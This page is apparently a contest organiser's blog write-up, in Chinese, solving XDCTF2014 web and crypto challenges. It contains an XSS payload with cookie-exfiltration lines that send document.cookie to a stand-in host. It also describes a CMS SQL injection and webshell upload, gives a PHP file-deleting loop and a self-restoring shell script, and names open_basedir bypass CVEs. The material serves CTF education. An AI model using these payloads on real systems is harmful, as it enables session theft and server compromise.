

<html class="no-js">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta name="keywords" content="" />
    <meta name="description" content="phith0n的小站，长期存在与分享关于网络安全与各种编程的原创文章。" />
    <title>XDCTF2014 部分Writeup | 离别歌</title>
    <link rel="alternate" type="application/atom+xml" href="../feed/index.rss" title="离别歌" />
    <link href="../static/deep/css/base.css" rel="stylesheet" type="text/css" />
    <link href="../static/deep/css/style.css" rel="stylesheet" type="text/css" />
    <link rel="shortcut icon" href="../static/deep/images/favicon.ico" />
    
<style>div.row .col-xs-4 {
  float: left;
  margin-left: 4px;
}
div.row .col-xs-4 img {
  margin-left: 5px;
}
</style>
<link href="https://cdn.staticfile.org/fancybox/2.1.7/css/jquery.fancybox.min.css" rel="stylesheet">
<link rel="stylesheet" href="../static/deep/css/code.css">

</head>
<body>
<!--[if lt IE 8]>
    <div class="browsehappy" role="dialog">当前网页 <strong>不支持</strong> 你正在使用的浏览器. 为了正常的访问, 请 <a href="http://browsehappy.com/">升级你的浏览器</a>.</div>
<![endif]-->
<div id="header">
    <div class="container">
        <h1 class="h1-title">
            <a href="../index.html">
               <img src="../static/deep/images/logo.png" alt="离别歌" />
            </a>
        </h1>
        <div id="nav">
        <input type="checkbox" id="button">
        <label for="button" onclick>菜单</label>
        
        <ul>
            
            <li class="item ">
                <a href="../index.html" >首页</a>
            </li>
            
            <li class="item ">
                <a href="../list/index.html" >文章</a>
            </li>
            
            <li class="item ">
                <a href="../other/tinger.html" >关于</a>
            </li>
            
            <li class="item ">
                <a href="../other/friends-link.html" >友链</a>
            </li>
            
            <li class="item ">
                <a href="https://github.com/phith0n" target="_blank" >项目</a>
            </li>
            
            <li class="item ">
                <a href="https://www.leavesongs.com/PENETRATION/code-auditor-secret-group.html" target="_blank" >代码审计</a>
            </li>
            
        </ul>
        
        </div>
    </div>
</div>

<div class="banner-bar">
    <div class="container">
        <div class="col-12 columns">
            <div class="place">
                <a href="../index.html">首页</a>
                &raquo;
                
                网络安全 &raquo; <a href="XDCTF-2014-Writeup.html">XDCTF2014 部分Writeup</a>
                
            </div>
        </div>
    </div>
</div>
<div class="container">
    <div class="col-11 columns" id="mainbody" role="main">
        <div class="post-single type-post">
            <h1 class="article-h1">XDCTF2014 部分Writeup</h1>
            <div class="details-up">
  <span class="author">作者: None</span>
  
  <span class="category">分类: <a href="../sort/PENETRATION.html">网络安全</a></span>
  
  <span class="date">时间: 2014-10-5 1:43</span>
  <span class="comments-top" itemprop="interactionCount">评论：<a itemprop="discussionUrl" href="#reply-list">7条评论</a></span>
  <span class="comments-top" itemprop="interactionCount">浏览：<a itemprop="discussionUrl" href="XDCTF-2014-Writeup.html">15338人看过</a></span>
  
  <span class="date">标签:
    
        <a href="../tag/XDCTF.html">XDCTF</a>
    
        <a href="../tag/writeup.html">writeup</a>
    
  </span>
  
</div>
            <div class="entry">
                <p class="p0" style="text-indent:21.0000pt;">
	首先我代表我们<span>XDCTF</span><span>主办方对大家说声辛苦了，十一假期本该休息却依旧奋斗在</span><span>CTF</span><span>第一线。我是</span><span>XDCTF2014</span><span>的出题人之一，也是服务器的维护者之一，关于比赛不想说太多，有太多不可控制的因素。包括中途停电之类的事情，也备受吐槽。</span> 
</p>
<p class="p0" style="text-indent:21.0000pt;">
	这份<span>writeup</span><span>是几道</span><span>web</span><span>题目和一个加密解密的题目，我知识面比较窄，所以题目和</span><span>writeup</span><span>都不能面面俱到，有一些想法在心里却最后没能放出来，所以这里也就不提了。</span> 
</p>
<p class="p0" style="text-indent:21.0000pt;">
	&nbsp;
</p>
<p class="p0">
	<strong>WEB20</strong> 
</p>
<p class="p0" style="text-indent:21.0000pt;">
	&nbsp;
</p>
<p class="p0" style="text-indent:21.0000pt;">
	“
</p>
<p class="p0" style="text-indent:21.0000pt;">
	什么，小<span>P</span><span>说来点彩头？先出个简单的，就</span><span>WEB20</span><span>吧。</span> 
</p>
<p class="p0" style="text-indent:21.0000pt;">
	题目链接：&nbsp;<span>WEB20</span> 
</p>
<p class="p0" style="text-indent:21.0000pt;">
	&nbsp;
</p>
<p class="p0" style="text-indent:21.0000pt;">
	hint&nbsp;&gt;&nbsp;<span>大家不知道复活节要玩什么吗？（非前端题，请勿关注</span><span>html</span><span>注释、</span><span>css</span><span>、</span><span>javascript</span><span>等）</span> 
</p>
<p class="p0" style="text-indent:21.0000pt;">
	”
</p>
<p class="p0" style="text-indent:21.0000pt;">
	&nbsp;
</p>
<p class="p0" style="text-indent:21.0000pt;">
	WEB20<span>是我很久以前就出好的一个题目，今年比赛特别多，不过一直没有被人家用上，所以就当个彩头送出来了，没想到还难倒了一批人。</span> 
</p>
<p class="p0" style="text-indent:21.0000pt;">
	考点是<span>php</span><span>彩蛋。只要运行</span><span>PHP</span><span>的服务器上，访问任何网页都可以在</span><span>URL</span><span>后添加以下字符串来查看信息</span><span>:</span> 
</p>
<p class="p0" style="text-indent:21.0000pt;">
	&nbsp;
</p>
<p class="p0" style="text-indent:21.0000pt;">
	?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000&nbsp;(PHP<span>信息列表</span><span>)</span> 
</p>
<p class="p0" style="text-indent:21.0000pt;">
	?=PHPE9568F34-D428-11d2-A769-00AA001ACF42&nbsp;(PHP<span>的</span><span>LOGO)</span> 
</p>
<p class="p0" style="text-indent:21.0000pt;">
	?=PHPE9568F35-D428-11d2-A769-00AA001ACF42&nbsp;(Zend&nbsp;LOGO)
</p>
<p class="p0" style="text-indent:21.0000pt;">
	?=PHPE9568F36-D428-11d2-A769-00AA001ACF42&nbsp;(PHP&nbsp;LOGO&nbsp;<span>蓝色大象</span><span>)</span> 
</p>
<p class="p0" style="text-indent:21.0000pt;">
	&nbsp;
</p>
<p class="p0" style="text-indent:21.0000pt;">
	基本很多<span>php</span><span>网站都存在彩蛋，比如乌云：</span> 
</p>
<p class="p0" style="text-indent:21.0000pt;">
	<a target="_blank" href="../content/uploadfile/201410/4efd1412444865.jpg" id="ematt:600"><img src="../content/uploadfile/201410/thum-4efd1412444865.jpg" title="点击查看原图" alt="01.jpg" border="0" width="650" height="367" /></a> 
</p>
<p class="p0" style="text-indent:21.0000pt;">
	所以我们可以通过在网站域名后面加“彩蛋”来判断一个网站是否是由<span>php</span><span>编写的。是否显示</span><span>php</span><span>彩蛋是通过</span><span>php.ini</span><span>中</span><span>expose_php</span><span>来控制的，设置为</span><span>Off</span><span>则不会显示了。</span> 
</p>
<p class="p0" style="text-indent:21.0000pt;">
	&nbsp;
</p>
<p class="p0">
	<strong>WEB200</strong> 
</p>
<p class="p0" style="text-indent:21.0000pt;">
	&nbsp;
</p>
<p class="p0" style="text-indent:21.0000pt;">
	“
</p>
<p class="p0" style="text-indent:21.0000pt;">
	自从小<span>P</span><span>告诉离休老干部</span><span>le4f&nbsp;python</span><span>怎么写网站以后，就一发不可收拾。</span> 
</p>
<p class="p0" style="text-indent:21.0000pt;">
	这是<span>le4f</span><span>的新作：</span><span>http://y0pk678.xdctf.com:8081/</span> 
</p>
<p class="p0" style="text-indent:21.0000pt;">
	说明：本题<span>flag</span><span>形式为</span><span>XDCTF{XXXX}</span><span>，填入</span><span>XXXX</span><span>内容即可。</span> 
</p>
<p class="p0" style="text-indent:21.0000pt;">
	”
</p>
<p class="p0" style="text-indent:21.0000pt;">
	&nbsp;
</p>
<p class="p0" style="text-indent:21.0000pt;">
	这题是冷夜出的一道题，分给的高了，是我的错。
</p>
<p class="p0" style="text-indent:21.0000pt;">
	一个<span>web.py</span><span>写的简单</span><span>web</span><span>应用，访问首页发现一具话“</span><span>u&nbsp;may&nbsp;need&nbsp;help&nbsp;information.</span><span>”，于是访问</span><span>http://y0pk678.xdctf.com:8081/help</span><span>，查看源码发现一个超链接：</span> 
</p>
<p class="p0" style="text-indent:21.0000pt;">
	<a target="_blank" href="../content/uploadfile/201410/3fb51412444875.jpg" id="ematt:602"><img src="../content/uploadfile/201410/thum-3fb51412444875.jpg" title="点击查看原图" alt="02.jpg" border="0" width="650" height="146" /></a> 
</p>
<p class="p0" style="text-indent:21.0000pt;">
	由超链接样子可以猜到是一个文件读取，访问之，发现应该是一个说明：
</p>
<p class="p0" style="text-indent:21.0000pt;">
	<a target="_blank" href="../content/uploadfile/201410/f9961412444880.jpg" id="ematt:604"><img src="../content/uploadfile/201410/f9961412444880.jpg" title="点击查看原图" alt="03.jpg" border="0" width="504" height="148" /></a> 
</p>
<p class="p0" style="text-indent:21.0000pt;">
	而且每次刷新出来的内容不一样。每次出来两行，可能是随机显示的。既然这里说了是<span>newapp.py</span><span>，那就把</span><span>file=readme</span><span>换成</span><span>file=newapp.py</span><span>看看：</span> 
</p>
<p class="p0" style="text-indent:21.0000pt;">
	<a target="_blank" href="../content/uploadfile/201410/2de41412444882.jpg" id="ematt:605"><img src="../content/uploadfile/201410/2de41412444882.jpg" title="点击查看原图" alt="04.jpg" border="0" width="501" height="167" /></a> 
</p>
<p class="p0" style="text-indent:21.0000pt;">
	很明显是一个<span>python</span><span>文件，但每次访问只显示两行。</span> 
</p>
<p class="p0" style="text-indent:21.0000pt;">
	于是自己写个简单的爬虫或用<span>burpsuite</span><span>将所有行读取出来，得到</span><span>newapp.py</span><span>的内容：</span> 
</p>
<p class="p0" style="text-indent:21.0000pt;">
	<a target="_blank" href="../content/uploadfile/201410/13501412444883.jpg" id="ematt:606"><img src="../content/uploadfile/201410/thum-13501412444883.jpg" title="点击查看原图" alt="05.jpg" border="0" width="650" height="407" /></a> 
</p>
<p class="p0" style="text-indent:21.0000pt;">
	如图，关键代码已圈出。在<span>xdctf</span><span>函数中（通过前面的路由规则可知访问</span><span>/getflag</span><span>会转到</span><span>xdctf</span><span>函数），如果</span><span>web.input()[</span>‘unabletoread’]&nbsp;==&nbsp;‘le4f.net’，则读到一个什么文件，把内容通过<span>header</span><span>发给我。</span> 
</p>
<p class="p0" style="text-indent:21.0000pt;">
	于是就访问<span>http://y0pk678.xdctf.com:8081/getflag?unabletoread=le4f.net&nbsp;</span><span>即可以在数据包中找到</span><span>flag</span><span>：</span> 
</p>
<p class="p0" style="text-indent:21.0000pt;">
	<a target="_blank" href="../content/uploadfile/201410/fac41412444886.jpg" id="ematt:608"><img src="../content/uploadfile/201410/thum-fac41412444886.jpg" title="点击查看原图" alt="06.jpg" border="0" width="650" height="569" /></a> 
</p>
<p class="p0" style="text-indent:21.0000pt;">
	&nbsp;
</p>
<p class="p0">
	<strong>WEB250</strong> 
</p>
<p class="p0">
	&nbsp;
</p>
<p class="p0" style="text-indent:21.0000pt;">
	一个存在<span>XSS</span><span>的留言板。</span> 
</p>
<p class="p0" style="text-indent:21.0000pt;">
	注册登录以后会有这样的提示：使用如下方式让留言更漂亮：
</p>
<p class="p0" style="text-indent:21.0000pt;">
	[a]http://<span>超链接</span><span>[/a]</span><span>、</span><span>[b]</span><span>粗体</span><span>[/b]</span><span>、</span><span>[pre]</span><span>代码</span><span>[/pre]</span><span>、</span><span>[i]</span><span>斜体</span><span>[/i]</span><span>等，不允许引用图片。</span> 
</p>
<p class="p0" style="text-indent:21.0000pt;">
	随便<span>fuzz</span><span>测试一下发现很多特殊符号被过滤了，包括</span><span>&lt;</span><span>、</span><span>&gt;</span><span>、</span>”、<span>=</span><span>、</span><span>(</span><span>、</span><span>)</span><span>等，但后面会把</span><span>[</span><span>、</span><span>]</span><span>转换成</span><span>&lt;</span><span>、</span><span>&gt;</span><span>，也就是说我们可以引入</span><span>html</span><span>标签。但问题是</span><span>=</span><span>没有了，</span><span>&lt;img&nbsp;src=1&nbsp;onerror=xxx&gt;</span><span>用不了</span><span>(</span><span>没等号</span><span>)</span><span>，</span><span>javascript</span><span>也各种用不了。</span> 
</p>
<p class="p0" style="text-indent:21.0000pt;">
	所以这里需要用到的知识是<span>&lt;svg&gt;</span><span>，在</span><span>&lt;svg&gt;</span><span>中的</span><span>&lt;script&gt;</span><span>代码可以用</span><span>html</span><span>实体代替。比如</span><span>&lt;svg&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><span>可以换成“</span><span>&lt;svg&gt;&lt;script&gt;&amp;# 97;&amp;# 108;&amp;# 101;&amp;# 114;&amp;# 116;&amp;# 40;&amp;# 49;&amp;# 41;&lt;/script&gt;</span><span>”，不过</span><span>html</span><span>实体的分号不能丢，这跟</span><span>html</span><span>属性中实体的分号可以省略不同。</span> 
</p>
<p class="p0" style="text-indent:21.0000pt;">
	所以这里输入<span>[svg][script]&amp;# 97;&amp;# 108;&amp;# 101;&amp;# 114;&amp;# 116;&amp;# 40;&amp;# 49;&amp;# 41;[/script]</span><span>即可弹窗（去掉&amp;#和数字间的空格）：</span> 
</p>
<p class="p0" style="text-indent:21.0000pt;">
	<a target="_blank" href="../content/uploadfile/201410/e4bd1412444887.jpg" id="ematt:610"><img src="../content/uploadfile/201410/e4bd1412444887.jpg" title="点击查看原图" alt="07.jpg" border="0" width="299" height="446" /></a> 
</p>
<p class="p0" style="text-indent:21.0000pt;">
	<a target="_blank" href="../content/uploadfile/201410/86c31412444891.jpg" id="ematt:611"><img src="../content/uploadfile/201410/thum-86c31412444891.jpg" title="点击查看原图" alt="08.jpg" border="0" width="650" height="403" /></a> 
</p>
<p class="p0" style="text-indent:21.0000pt;">
	弹窗后有的同学就直接<span>document.write(</span>‘&lt;script&nbsp;src=xxx&gt;&lt;/script&gt;’)<span>开始了，这样肯定是不行的，因为我加了个小小的坑，做了</span><span>csp</span><span>限制，当然不是让你绕过</span><span>csp</span><span>，因为我并没有限制内联脚本执行。</span> 
</p>
<p class="p0" style="text-indent:21.0000pt;">
	所以直接利用<span>xss</span><span>平台来加载远程</span><span>js</span><span>，执行代码是不现实了（</span><span>csp</span><span>里限制了加载外部资源），也不能通过常规的</span><span>new&nbsp;Image().src</span><span>来传递</span><span>cookie</span><span>了。</span> 
</p>
<p class="p0" style="text-indent:21.0000pt;">
	换个方式即可，
</p>
<p class="p0" style="text-indent:21.0000pt;">
	location.href=”http://xss.com/?cookie=”+escape(document.cookie)<span>，</span> 
</p>
<p class="p0" style="text-indent:21.0000pt;">
	或者
</p>
<p class="p0" style="text-indent:21.0000pt;">
	var&nbsp;a=document.createElement("a");a.href='http://xss.com/?cookie='+escape(document.cookie);a.click();
</p>
<p class="p0" style="text-indent:21.0000pt;">
	都可以。让页面跳转到你的<span>xss</span><span>平台并将</span><span>cookie</span><span>带在参数中即可。</span> 
</p>
<p class="p0" style="text-indent:21.0000pt;">
	这道<span>XSS</span><span>题还有另一个思路，注册的时候的用户名写成</span><span>javascript</span><span>代码，如“</span><span>*/alert(1);/*</span><span>”，然后发表两条留言，</span><span>[/script]</span><span>和</span><span>[script]</span><span>，这样就能拼接而成一个完整的</span><span>payload</span><span>。</span> 
</p>
<p class="p0" style="text-indent:21.0000pt;">
	&nbsp;
</p>
<p class="p0">
	<strong>CRACK180</strong> 
</p>
<p class="p0">
	&nbsp;
</p>
<p class="p0">
	“
</p>
<p class="p0">
	&nbsp;&nbsp;ZZ<span>发现土豪</span><span>Ph</span><span>在用</span><span>SafeAccountSystem</span><span>给</span><span>Le4f</span><span>打一笔退休金</span><span>$23333</span><span>，</span><span>ZZ</span><span>截断了支付过程的密文，打算捉弄一下他们把退休金打到自己账户</span><span>Z2333</span><span>上。</span> 
</p>
<p class="p0">
	&nbsp;
</p>
<p class="p0">
	密文点此处下载<span>:&nbsp;http://game1.xdctf.com:8081/Z4l2Lu7XkNBa/crypt.txt</span> 
</p>
<p class="p0">
	&nbsp;
</p>
<p class="p0">
	支付系统的地址&nbsp;<span>game1.xdctf.com&nbsp;&nbsp;&nbsp;</span><span>端口，</span><span>50008</span><span>，请用</span><span>nc</span><span>连接（</span><span>telnet</span><span>不行）</span> 
</p>
<p class="p0">
	本题考点加密与解密，可是没这个分类，真拙计。
</p>
<p class="p0">
	本题<span>flag</span><span>形如</span><span>xdctf{xxx}</span><span>，答案填入</span><span>xxx</span><span>即可。</span> 
</p>
<p class="p0">
	”
</p>
<p class="p0">
	&nbsp;
</p>
<p class="p0">
	下载劫持到的支付密文，可以看出混有培根密码，将其中的培根转换为正常字符，
</p>
<p class="p0">
	595270AABAA5853AAAAB133AABAA07AAAABAAABBAAAAB5AAABB7AABAB827AAABB0AAABBAABAB6AAAAA910AAABBAABAA23289280801AABABAAAAAAABAAAABABAAABBAAABB4078AABAA56AABABAAAAB8AAABA2AAAAB5AAABA881AABAB2AAAAB7AABAB58AAAAA096AAAAA367AAAAA32AAAABAABAA33AAABB7248989AAABB6AAAAB2319AABAB091AABABAABAB4AAAAA12AABABAABAB2AAAAA4717AAABB4AAABA01AAAAB242927AAAABAABAA0643AABAB06AABABAAAABAABAA29AAAAB10AAAAAAABAA
</p>
<p class="p0">
	&nbsp;
</p>
<p class="p0">
	解密后：
</p>
<p class="p0">
	595270e5853b133e07bdb5d7f827d0df6a910de23289280801faefdd4078e56fb8c2b5c881f2b7f58a096a367a32be33d7248989d6b2319f091ff4a12ff2a4717d4c01b242927be0643f06fbe29b10ae
</p>
<p class="p0">
	&nbsp;
</p>
<p class="p0">
	&nbsp;
</p>
<p class="p0">
	登陆题目系统，建立账户测试，比如建立账户<span>Alice</span><span>和</span><span>Bob</span><span>，然后选择支付模式</span><span>1</span><span>，支付数额</span><span>100</span><span>，然后系统提示余额不足，支付失败。</span> 
</p>
<p class="p0">
	改变支付数额，比如改为<span>200</span><span>，其他信息不变，可以发现密文中只有一段密文变化，由此可猜测密文是分组加密，提取劫持到的密文中的这一部分。</span><span>&nbsp;</span> 
</p>
<p class="p0">
	继续改变收款人和支付人的姓名进行测试，可以确定收款人和支付人在密文中的位置。确定之后，改变支付方式，确定<span>Ph</span><span>使用的支付方式为第三种。并且发现</span><span>One-time-password</span><span>并不是一次性的。</span> 
</p>
<p class="p0">
	&nbsp;
</p>
<p class="p0">
	最后确定密文格式如下
</p>
<p class="p0">
	&nbsp;
</p>
<p class="p0">
	收款人<span>+</span><span>支付方式</span><span>+One-Time-Password+</span><span>支付人</span><span>+</span><span>支付数额</span> 
</p>
<p class="p0">
	&nbsp;
</p>
<p class="p0">
	提取其中的<span>OneTimePassword</span><span>，为</span><span>b8c2b5c881f2b7f58a096a367a32be33</span> 
</p>
<p class="p0">
	&nbsp;
</p>
<p class="p0">
	&nbsp;
</p>
<p class="p0">
	根据系统流程，<span>sender</span><span>输入</span><span>Ph</span><span>，正确输入</span><span>OneTimePassword</span><span>，</span><span>Receiver</span><span>输入</span><span>Z2333</span><span>，支付方式选择</span><span>3</span><span>，数额为</span><span>23333</span><span>即可弹出</span><span>flag&nbsp;&nbsp;xdctf{d4d5906bb2f30b3bbbc1d915e6ba0f7321}</span> 
</p>
<p class="p0">
	&nbsp;
</p>
<p class="p0" style="text-indent:21.0000pt;">
	&nbsp;
</p>
<p class="p0">
	<strong>WEB270</strong> 
</p>
<p class="p0">
	&nbsp;
</p>
<p class="p0" style="text-indent:21.0000pt;">
	“
</p>
<p class="p0" style="text-indent:21.0000pt;">
	小<span>P</span><span>睡了一觉起来，发现黑客们都饥渴难耐，想日站想疯了。</span> 
</p>
<p class="p0" style="text-indent:21.0000pt;">
	小<span>P</span><span>默默地看了看自己的网站：</span><span>http://ph.xdctf.com:8082/&nbsp;</span> 
</p>
<p class="p0" style="text-indent:21.0000pt;">
	感觉不知道放个什么程序比较好，而同服的另一个网站居然已经运营很久了：<span>http://hlecgsp1.xdctf.com:8082/</span> 
</p>
<p class="p0" style="text-indent:21.0000pt;">
	真不知道该怎么办……
</p>
<p class="p0" style="text-indent:21.0000pt;">
	&nbsp;
</p>
<p class="p0" style="text-indent:21.0000pt;">
	ps.
</p>
<p class="p0" style="text-indent:21.0000pt;">
	这是一个系列题目，分步骤给分。一共<span>4</span><span>个</span><span>FLAG</span><span>都在小</span><span>P</span><span>网站所在的服务器中。</span> 
</p>
<p class="p0" style="text-indent:21.0000pt;">
	请黑客们不要破坏网站文件、数据库。一旦发现有阻碍比赛正常进行的现象，将会恢复服务器到最初状态。
</p>
<p class="p0" style="text-indent:21.0000pt;">
	说明：<span>4</span><span>个</span><span>flag</span><span>都形如</span><span>flag-xxxx</span> 
</p>
<p class="p0" style="text-indent:21.0000pt;">
	”
</p>
<p class="p0" style="text-indent:21.0000pt;">
	<br />
</p>
<p class="p0" style="text-indent:21.0000pt;">
	这题考点是<span>cms</span><span>渗透实战</span><span>+open_basedir</span><span>绕过。</span> 
</p>
<p class="p0" style="text-indent:21.0000pt;">
	一共四个<span>flag</span><span>，实际上除了第三个，都比较好拿。</span> 
</p>
<p class="p0" style="text-indent:21.0000pt;">
	首先来到<span>phpok</span><span>，</span><span>http://wooyun.org/bugs/wooyun-2010-064360</span><span>这里有一个现成的注入，构造一下获得管理员密码：</span> 
</p>
<p class="p0" style="text-indent:21.0000pt;">
	<a target="_blank" href="../content/uploadfile/201410/10581412444896.jpg" id="ematt:613"><img src="../content/uploadfile/201410/thum-10581412444896.jpg" title="点击查看原图" alt="09.jpg" border="0" width="650" height="184" /></a> 
</p>
<p class="p0" style="text-indent:21.0000pt;">
	解密得到密码为<span>198712</span><span>，进入后台。在</span><span>smtp</span><span>密码处得到一个</span><span>flag</span><span>。</span> 
</p>
<p class="p0" style="text-indent:21.0000pt;">
	后台编辑风格处将模板后缀名改为<span>php</span><span>：</span> 
</p>
<p class="p0" style="text-indent:21.0000pt;">
	<a target="_blank" href="../content/uploadfile/201410/ae561412444899.jpg" id="ematt:615"><img src="../content/uploadfile/201410/thum-ae561412444899.jpg" title="点击查看原图" alt="10.jpg" border="0" width="650" height="475" /></a> 
</p>
<p class="p0" style="text-indent:21.0000pt;">
	然后编辑模板，添加一个<span>php</span><span>文件，写入</span><span>shell</span><span>即可。</span> 
</p>
<p class="p0" style="text-indent:21.0000pt;">
	<a target="_blank" href="../content/uploadfile/201410/bd221412444901.jpg" id="ematt:617"><img src="../content/uploadfile/201410/bd221412444901.jpg" title="点击查看原图" alt="0011.jpg" border="0" width="486" height="244" /></a> 
</p>
<p class="p0" style="text-indent:21.0000pt;">
	<br />
</p>
<p class="p0" style="text-indent:21.0000pt;">
	在网站根目录下文件中找到第二个<span>flag</span><span>。</span> 
</p>
<p class="p0" style="text-indent:21.0000pt;">
	关于<span>GETSHELL</span><span>这部分，有同学在比赛期间和我反应，说有人删</span><span>shell</span><span>，这是所有</span><span>ctf</span><span>里都无法避免的。下面是我曾经用过的一个猥琐脚本： </span> 
</p>
<pre class="brush: php;auto-links: false;">&lt;?php
ignore_user_abort(true);
set_time_limit(0);
$file = isset($_GET['file']) ? $_GET['file'] : 'test.txt';
 
while (TRUE) {
if (file_exists($file)) {
@unlink($file);
}
usleep(50);
}
?&gt;</pre>
<p>
	<br />
</p>
<p class="p0" style="text-indent:21.0000pt;">
	让代码进驻在内存中，循环删除某个文件。当然，同样也可以变成某个目录的所有文件。
</p>
<p class="p0" style="text-indent:21.0000pt;">
	既然无法避免，那么为何我们不能与选择与之抗衡呢？比如我们再来一个“防删脚本”：
</p>
<p class="p0" style="text-indent:21.0000pt;">
	<br />
</p>
<pre class="brush: php;auto-links: false;">&lt;?php
ignore_user_abort(true);
set_time_limit(0);
$file = __FILE__; // or xxx.php
$shell = isset($_GET['shell']) ? $_GET['shell'] : file_get_contents($file);
 
while (TRUE) {
if (!file_exists($file)) {
file_put_contents($file, $shell);
}
usleep(50);
}
?&gt;</pre>
<p>
	<br />
</p>
<p class="p0" style="text-indent:21.0000pt;">
	让代码进驻在内存中，循环判断。一旦发现自己的文件被删除了，就重新写入。
</p>
<p class="p0" style="text-indent:21.0000pt;">
	当然，后来我把<span>unlink</span><span>禁用了，不过其实是无法阻止删</span><span>shell</span><span>现象的，因为就算不能删除，也可以把文件覆盖掉，只要让你没法连接即可。而且，写文件的函数是没法禁用的，否则影响比赛的正常进行。</span> 
</p>
<p class="p0" style="text-indent:21.0000pt;">
	再者，有些同学拿到<span>webshell</span><span>了以后一看到服务器是</span><span>linux</span><span>并且版本很高（</span><span>3.2</span><span>），就无处下手了。假如没有其他人提示说去绕过</span><span>open_basedir</span><span>，最终又有多少人能做出这道题，因为我观察过，</span><span>web270-3</span><span>出来很久也没有人做出来，已经有人说坑了，但当第一个人做出来以后基本人数就是直线上升。我不恶意揣测存在交换</span><span>key</span><span>的现象，但一定存在做出来的人给没做出来的提示，或询问做题思路的现象。</span> 
</p>
<p class="p0" style="text-indent:21.0000pt;">
	第三、四个<span>flag</span><span>在同服的另一个网站中，但因为</span><span>php</span><span>设置了</span><span>open_basedir</span><span>，所以似乎无法跨目录读取文件什么的。</span> 
</p>
<p class="p0" style="text-indent:21.0000pt;">
	绕过<span>open_basedir</span><span>有几个思路：</span> 
</p>
<p class="p0" style="text-indent:21.0000pt;">
	1.mysql<span>账户如果有</span><span>file_priv</span><span>权限，则可以通过</span><span>mysql&nbsp;load_file</span><span>来跨目录读文件。</span> 
</p>
<p class="p0" style="text-indent:21.0000pt;">
	2.利用一些<span>php</span><span>漏洞绕过</span><span>open_basedir</span> 
</p>
<p class="p0" style="text-indent:21.0000pt;">
	3.Php<span>如果能执行命令，则直接通过命令行访问</span><span>open_basedir</span><span>以外的目录即可。</span> 
</p>
<p class="p0" style="text-indent:21.0000pt;">
	4.提权
</p>
<p class="p0" style="text-indent:21.0000pt;">
	第<span>3</span><span>、</span><span>4</span><span>个在本题中不现实，因为能执行命令的函数都被禁用了。而我特地给</span><span>mysql</span><span>账户</span><span>phpok</span><span>给予了</span><span>file_priv</span><span>权限，所以可以通过</span><span>mysql&nbsp;load_file</span><span>读取</span><span>/home/wwwroot/ph/config.php</span><span>中的</span><span>flag</span><span>，得到第四个</span><span>flag</span><span>。</span> 
</p>
<p class="p0" style="text-indent:21.0000pt;">
	绕过<span>open_basedir</span><span>的</span><span>CVE</span><span>也有很多：</span> 
</p>
<p class="p0" style="text-indent:21.0000pt;">
	写文件：<span>CVE-2012-1171(libxml)</span> 
</p>
<p class="p0">
	&nbsp;		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp; &nbsp;&nbsp;CVE-2012-3365(SQLite)
</p>
<p class="p0" style="text-indent:21.0000pt;">
	读文件：<span>CVE-2012-1171</span> 
</p>
<p class="p0" style="text-indent:21.0000pt;">
	列目录：<a href="http://ahack.ru/releases/glob_wrapper_open_basedir_exploit.php.txt" target="_blank">http://ahack.ru/releases/glob_wrapper_open_basedir_exploit.php.txt</a> 
</p>
<p class="p0" style="text-indent:21.0000pt;">
	当然，之前<span>parsec</span><span>团队的</span><span>/fd</span><span>曾经在</span><span>zone</span><span>里发过一个利用脚本：</span><a href="http://zone.wooyun.org/content/11268" target="_blank">http://zone.wooyun.org/content/11268</a>&nbsp;。这里可以直接上。
</p>
<p class="p0" style="text-indent:21.0000pt;">
	列出目录<span>/home/wwwroot/ph/</span><span>，目录下的一个</span><span>flag-</span><span>开头的文件名，即为第三个</span><span>flag</span><span>。</span> 
</p>
<p class="p0" style="text-indent:21.0000pt;">
	所以，不能盲目信任<span>php</span><span>的</span><span>open_basedir</span><span>，如果要配置好虚拟主机环境，可以参考我之前的一篇文章：</span><a href="nginx-safe-dir.html" target="_blank">https://www.leavesongs.com/PENETRATION/nginx-safe-dir.html</a> 
</p>
<p class="p0" style="text-indent:21.0000pt;">
	<span style="text-indent:21pt;line-height:1.5;">&nbsp;</span> 
</p>
<p class="p0">
	<strong>一些感想</strong> 
</p>
<p class="p0" style="text-indent:21.0000pt;">
	这次比赛所有的<span>nginx</span><span>环境都是严格按照上文中方法搭建（当然不包括</span><span>WEB270</span><span>那个可被绕过的），杜绝了跨目录等影响，不同的题目放在不同虚拟主机下运行，互不干扰，保证了初赛环境的安全。</span> 
</p>
<p class="p0" style="text-indent:21.0000pt;">
	本次比赛交流思路<span>的现象依旧存在，比如</span><span>web270[3]</span><span>，之前说了，题目出来以后很长时间内没有人提交</span><span>flag</span><span>，但当第一个人提交了</span><span>flag</span><span>以后人数很快就上去了。</span> 
</p>
<p class="p0" style="text-indent:21.0000pt;">
	当然我在很多群中也发现有<span>讨论题目详情的现象，此为</span><span>CTF</span><span>常态，我就不多说了。</span> 
</p>
<p class="p0" style="text-indent:21.0000pt;">
	我个人很少参加<span>ctf</span><span>比赛，不像</span><span>L</span><span>团队中其他同学，所以出的题目如果有些不好的地方，也希望各位能够海涵。此次题目重点在逆向和溢出，也是历年</span><span>XDCTF</span><span>最后拿分的类别，也希望各位能更加关注这两类题目。</span> 
</p>
<p class="p0" style="text-indent:21.0000pt;">
	决赛的环境会比预赛丰富精彩，敬请期待。
</p>
<p class="p0" style="text-indent:21.0000pt;">
	当然，感谢西电的其他几位主办方同学，特别是<span>rabit2013</span><span>同学，出题</span><span>+</span><span>审题是最辛苦的。这些活本该是我和</span><span>XDSEC</span><span>一些成员一起做的，但因为诸多原因打了个小酱油，包括之前去</span><span>ISC</span><span>耽误了很多事情，深表抱歉！</span> 
</p>
<p>
	<br />
</p>
<p class="p0" style="text-indent:21.0000pt;">
	<span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span> 
</p>
            </div>
            <div itemprop="keywords" class="tags-meta">
                标签:
                
                    <a href="../tag/XDCTF.html">XDCTF</a>
                
                    <a href="../tag/writeup.html">writeup</a>
                
            </div>
            <br>
<!--MOB SHARE BEGIN-->
<div class="-mob-share-ui-button -mob-share-open">分享</div>
<div class="-mob-share-ui" style="display: none">
    <ul class="-mob-share-list">
        <li class="-mob-share-weibo"><p>新浪微博</p></li>
        <li class="-mob-share-qzone"><p>QQ空间</p></li>
        <li class="-mob-share-qq"><p>QQ好友</p></li>
        <li class="-mob-share-weixin"><p>微信</p></li>
        <li class="-mob-share-douban"><p>豆瓣</p></li>
        <li class="-mob-share-facebook"><p>Facebook</p></li>
